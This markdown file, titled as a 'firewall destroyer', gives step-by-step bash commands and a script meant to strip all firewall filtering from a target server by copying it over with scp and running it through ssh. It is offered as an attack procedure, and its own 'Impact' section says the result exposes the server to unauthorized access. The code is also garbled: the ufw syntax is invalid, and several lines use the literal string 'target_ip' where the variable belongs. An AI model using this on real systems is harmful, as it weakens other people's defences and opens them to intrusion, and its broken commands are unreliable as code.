# Pandoras_gate_zero_defence_Firewall_destroyer

Markdown
# Script to Open and Unfilter All Ports on a Target Server

## Procedure

1. Identify the IP address of the target server using the `dig` command.

```bash
target_ip=$(dig +short target_server A | head -n 1)

Create a new file named open_ports.sh using the touch command.
Bash
touch open_ports.sh

Open the open_ports.sh file in a text editor and add the following content:
Bash
#!/bin/bash

# This script will open all ports on the target server and make them unfiltered.

target_ip=$target_ip

# Open all ports on the target server using the `ufw allow all` command.

ufw allow all to $target_ip

# Check if the command succeeded.

if [ $? -ne 0 ]; then
  echo "Failed to open ports on target server"
  exit 1
fi

# Verify that the ports are unfiltered using the `ufw status` command.

ufw status

Save and close the open_ports.sh file.

Make the open_ports.sh file executable using the chmod command.

Bash
chmod +x open_ports.sh

Copy the open_ports.sh file to the target server using the scp command.
Bash
scp open_ports.sh target_ip:/tmp

Execute the open_ports.sh file on the target server using the ssh command.
Bash
ssh target_ip 'bash /tmp/open_ports.sh'


## Impact

By executing this script, all ports on the target server will be opened and made unfiltered. This means that any device on the internet can connect to any port on the target server, potentially exposing sensitive data or allowing unauthorized access. It is crucial to exercise caution when using this script and ensure that only authorized devices can access the target server.


